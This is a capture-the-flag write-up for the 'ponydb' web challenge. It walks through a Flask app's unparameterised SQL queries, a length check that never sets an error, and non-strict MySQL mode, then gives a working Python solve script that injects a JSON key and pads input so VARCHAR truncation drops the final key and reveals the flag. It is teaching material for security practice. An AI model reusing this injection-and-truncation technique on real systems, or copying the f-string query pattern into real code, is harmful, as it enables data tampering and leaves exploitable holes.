---
description: SQL injection and truncation attack
---

# ponydb

## Description

http://ponydb.chal.uiuc.tf

(note: has unintended element that makes it slightly easier. see miniaturehorsedb for the full-difficulty challenge.)

**author**: kmh

{% file src="../../.gitbook/assets/handout.tar.gz" %}
handout.tar.gz
{% endfile %}

## Solution

### Source Code Analysis

We are provided with the source code for a Flask web application.

First, a MySQL connection is established and a `ponies` table is created. The flag is also loaded into the `flag` variable.

```python
flag = os.environ['FLAG']

config = {
	'host': os.environ['DB_HOST'],
	'user': os.environ['DB_USER'],
	'password': os.environ['DB_PASS'],
	'database': os.environ['DB'],
	'sql_mode': 'NO_BACKSLASH_ESCAPES'
}

for i in range(30):
	try:
		conn = mysql.connector.connect(**config)
		break
	except mysql.connector.errors.DatabaseError:
		time.sleep(1)
else: conn = mysql.connector.connect(**config)
cursor = conn.cursor()
try: cursor.execute('CREATE TABLE `ponies` (`name` varchar(64), `bio` varchar(256), '
                    '`image` varchar(256), `favorites` varchar(256), `session` varchar(64))')
except mysql.connector.errors.ProgrammingError: pass
cursor.close()
conn.close()
```

There are two endpoints, `GET /` and `POST /pony`. Let's take a look at how they behave.

#### GET Endpoint

```python
@app.route('/')
def ponies():
	cnx = mysql.connector.connect(**config)
	cur = cnx.cursor()

	if 'id' not in session:
		session['id'] = secrets.token_hex(32)
		cur.execute("INSERT INTO `ponies` VALUES ('Pwny', 'Pwny is the official mascot of SIGPwny!', "
		            "'https://sigpwny.github.io/images/logo.png', " + \
		            f"'{{\"color\":\"orange\",\"word\":\"pwn\",\"number\":13}}', '{session['id']}')")
		cnx.commit()
```

If a session ID has not yet been assigned, a secure one is generated and the `ponies` table in the database is populated with a default pony.&#x20;

Interestingly, f-strings are used instead of [parameterized queries](https://cheatsheetseries.owasp.org/cheatsheets/Query\_Parameterization\_Cheat\_Sheet.html). In this case, unfortunately, we do not have control over `session['id']`.&#x20;

Note the unusual format of the `favorites` data - it is meant to be a JSON string. The default pony has the following `favorites` data:

```python
{"color":"orange","word":"pwn","number":13}
```

A `SELECT` statement is then used to fetch the ponies corresponding to the session ID. Notice that the `favorites` data is parsed by `json.loads()` into a Python dictionary.

The ponies' data is stored into the `ponies` variable.

```python
	ponies = []
	cur.execute(f"SELECT * FROM `ponies` WHERE session='{session['id']}'")
	for (name, bio, image, data, _) in cur:
		ponies.append({"name": name, "bio": bio, "image": image, "favorites": json.loads(data)})

	cur.close()
	cnx.close()
```

Finally, the `ponies.html` template is rendered with the `ponies` and `flag` variables.

```python
return render_template('ponies.html', ponies=ponies, flag=flag)
```

In `ponies.html`, we find that `flag` is rendered under the condition that the pony's "favorite number" (the one stored in the JSON data) is 1337. This is the condition we have to bypass in order to solve the challenge.

```haskell
{% raw %}
{% for favorite in pony['favorites'] %}
	<p>Favorite {{ favorite }}: {{ pony['favorites'][favorite] }}</p>
	{% if favorite == 'number' and pony['favorites'][favorite] == 1337 %}
		<p>Favorite flag: {{ flag }}</p>
	{% endif %}
{% endfor %}
{% endraw %}
```

#### POST Endpoint

Now, if we look at the POST endpoint, we will start to get an idea of the intended exploit.

There are 7 parameters to submit. Each one is checked for single quotes (`'`), and the length of the parameters are checked. While we have control over the `number` parameter, the validation ensures that it is an integer from 0 to 100, so we cannot simply set it to 1337.

```python
@app.route('/pony', methods=['POST'])
def add():
	error = None

	name = request.form['name']
	if "'" in name: error = 'Name may not contain single quote'
	if len(name) > 64: error = 'Name too long'

	bio = request.form['bio']
	if "'" in bio: error = 'Bio may not contain single quote'
	if len(bio) > 256: error = 'Bio too long'

	image = request.form['image']
	if "'" in image: error = 'Image URL may not contain single quote'
	if len(image) > 256: error = 'Image URL too long'

	favorite_key = request.form['favorite_key']
	if "'" in favorite_key: error = 'Custom favorite name may not contain single quote'
	if len(favorite_key) > 64: 'Custom favorite name too long'

	favorite_value = request.form['favorite_value']
	if "'" in favorite_value: error = 'Custom favorite may not contain single quote'
	if len(favorite_value) > 64: 'Custom favorite too long'

	word = request.form['word']
	if "'" in word: error = 'Word may not contain single quote'
	if len(word) > len('antidisestablishmentarianism'): error = 'Word too long'

	number = int(request.form['number'])
	if number >= 100: error = "Ponies can't count that high"
	if number < 0: error = "Ponies can't count that low"
```

If the checks are passed, then the following `INSERT` statement is executed. Once again, f-strings are used instead of parameterized queries. This time, however, we have control over the variables through the POST request.&#x20;

```python
if error: flash(error)
	else:
		cnx = mysql.connector.connect(**config)
		cur = cnx.cursor()
		cur.execute(f"INSERT INTO `ponies` VALUES ('{name}', '{bio}', '{image}', " + \
		            f"'{{\"{favorite_key.lower()}\":\"{favorite_value}\"," + \
		            f"\"word\":\"{word.lower()}\",\"number\":{number}}}', " + \
		            f"'{session['id']}')")
		cnx.commit()
		cur.close()
		cnx.close()
```

While single quotes are filtered, we can easily escape out of the double quotes used in the JSON string. At first thought, we might think that we can simply inject a custom `"number": 1337` key-value pair to pass the number check in the Jinja template, thereby rendering the flag in the GET response.&#x20;

For instance, if we submit `number":1337,"color` as the `favorite_key` parameter, the inserted JSON string would be:

```javascript
{"number":1337,"color":"orange","word":"pwn","number":13}
```

Unfortunately, as stated in the documentation, `json.loads()` handles repeated keys in JSON objects by ignoring everything except the last key-value pair.

![](<../../.gitbook/assets/Screenshot 2021-08-03 at 6.29.36 PM.png>)

Therefore, while we might be able to inject a custom `number` key-value pair into the JSON string _stored in the database_, it will eventually be ignored when parsed by the `json` library.

#### The (Unintended) Fatal Flaw

It took us a few hours to spot this, but there was a flaw in the code. The `favorite_key` and `favorite_value` length checks actually don't produce any errors!

The `error` variable should have been assigned as follows.

```python
if len(favorite_value) > 64: error = 'Custom favorite too long'
```

Instead, the string was not assigned to any variable.

```python
if len(favorite_value) > 64: 'Custom favorite too long'
```

Now, if we look back at the creation of the `ponies` table, we will find that the `favorites` column has a maximum length of 256.

```sql
CREATE TABLE `ponies` ( ..., `favorites` varchar(256), ... )
```

#### The Ultimate Fatal Flaw

According to the [MySQL documentation](https://dev.mysql.com/doc/refman/8.0/en/char.html), if strict SQL mode is not enabled, assigning a VARCHAR value that exceeds the column length will cause the value to be truncated without raising an error.

> If strict SQL mode is not enabled and you assign a value to a CHAR or VARCHAR column that exceeds the column's maximum length, the value is truncated to fit and a warning is generated. For truncation of nonspace characters, you can cause an error to occur (rather than a warning) and suppress insertion of the value by using strict SQL mode. See Section 5.1.11, “Server SQL Modes”.

Note that while strict SQL mode is enabled by default, the `sql_mode` option was set to `'NO_BACKSLASH_ESCAPES'`.

```python
config = {
	
	...
	
	'sql_mode': 'NO_BACKSLASH_ESCAPES'
}
```

As specified in the Python MySQL Connector [documentation](https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlconnection-sql-mode.html), this option should be a string of comma-separated modes. Evidently, the above configuration leaves out `STRICT_TRANS_TABLES` and `STRICT_ALL_TABLES`, either of which would have enabled strict SQL mode.

### Exploitation

Let's revisit the earlier payload. We have `number":1337,"color` as `favorite_key`, which results in the following `favorites` string being inserted into the database:

```javascript
{"number":1337,"color":"orange","word":"pwn","number":13}
```

We can leverage the truncation to "push out" the final `"number":13` from the 256-character VARCHAR and insert a truncated string _without_ the final key-value pair. This will resolve the repeated key problem when using `json.loads()`.

My final solve script looked like this. We first set the `favorite_key` and `favorite_value`, with `favorite_key` containing the `"number": 1337` key-value pair and `favorite_value` ending in `"}`. Next, we create the JSON string up to `favorite_value`.&#x20;

Then, we can calculate the number of remaining characters needed to complete the 256-character VARCHAR. This number of characters will be appended to the beginning of `favorite_value`.

```python
import json
import requests
import re

name = 'test'
bio = 'test'
image = 'test'
favorite_key = 'number":1337,"color'
favorite_value = 'A"}'
word = 'test'
number = '1'
session = {'id': 5}

favorites = f"{{\"{favorite_key.lower()}\":\"{favorite_value}"

length = len(favorites)
print("Current length:", length, '\n')

remaining = 256 - length
favorite_value = 'A' * remaining + favorite_value

print("favorite_value:", favorite_value, '\n')

favorites = f"{{\"{favorite_key.lower()}\":\"{favorite_value}\"," + \
		            f"\"word\":\"{word.lower()}\",\"number\":{number}}}"

print("Length before truncation:", len(favorites), '\n')

sql = f"INSERT INTO `ponies` VALUES ('{name}', '{bio}', '{image}', " + \
		            f"'{{\"{favorite_key.lower()}\":\"{favorite_value}\"," + \
		            f"\"word\":\"{word.lower()}\",\"number\":{number}}}', " + \
		            f"'{session['id']}')"

print("SQL statement:", sql, '\n')

data = f"{{\"{favorite_key.lower()}\":\"{favorite_value}\"," + \
		            f"\"word\":\"{word.lower()}\",\"number\":{number}}}"

data = json.loads(data[:256])
print("Parsed JSON:", data, '\n')

s = requests.session()
s.get("http://ponydb.chal.uiuc.tf")

payload = {
	"name": name,
	"bio": bio,
	"image": image,
	"favorite_key": favorite_key,
	"favorite_value": favorite_value,
	"word": word,
	"number": number
}

r = s.post("http://ponydb.chal.uiuc.tf/pony", data=payload)
match = re.search(r"<p>Favorite flag: (.+)</p>", r.text)
print(match[1])
```

![](<../../.gitbook/assets/Screenshot 2021-08-03 at 7.50.15 PM.png>)

The last part of the script just automates the HTTP requests. We could, of course, submit the payload manually as well, and see our pony in all its glory.

![](<../../.gitbook/assets/image (22).png>)
